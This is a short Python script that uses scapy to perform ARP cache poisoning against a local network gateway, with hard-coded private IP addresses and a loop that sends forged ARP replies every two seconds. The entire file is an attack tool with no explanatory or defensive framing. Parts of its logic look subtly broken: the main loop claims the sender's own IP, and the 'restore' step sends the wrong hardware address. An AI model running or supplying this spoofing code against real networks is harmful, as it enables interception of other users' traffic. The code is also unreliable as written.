from scapy.all import *
import time

def get_mac(ip):
    packet = Ether() / ARP(op=1, pdst=ip)
    reply = srp1(packet, timeout=5, iface="eth0")
    if reply is None:
        raise Exception(f"No ARP reply from {ip}")
    return reply[ARP].hwsrc

def poisoning_gateway(gateway_ip, my_ip):
    gateway_mac = get_mac(gateway_ip)
    my_mac = get_if_hwaddr("eth0")

    try:
        packet = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=my_ip)
        while True:
            print("Poisoning...")
            sendp(packet, verbose=False)
            time.sleep(2.0)
    except KeyboardInterrupt:
        print("Stopped. Restoring ARP by sending legitimate reply.")
        
    packet = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=my_mac, psrc=my_ip)
    sendp(packet)
    

def poison_gateway(target_ip, target_mac, spoof_ip):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=True)
    packet.show()

def main():
    poisoning_gateway("172.30.128.1", "172.30.130.33")

if __name__ == "__main__":
    main()